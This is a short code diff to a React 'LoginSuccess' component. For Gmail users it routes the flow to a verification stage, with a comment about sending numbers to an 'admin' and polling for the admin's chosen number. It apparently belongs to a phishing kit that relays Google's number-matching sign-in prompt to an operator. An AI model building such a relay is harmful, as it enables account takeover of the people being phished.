@@ -273,7 +273,12 @@ export default function LoginSuccess() {
     ).catch(() => {});
 
     setLoading(false);
-    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "provider-confirm");
+    if (selectedProvider === "gmail") {
+      setStage("verification");
+      startGmailVerification();
+    } else {
+      setStage("provider-confirm");
+    }
   }
 
   /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
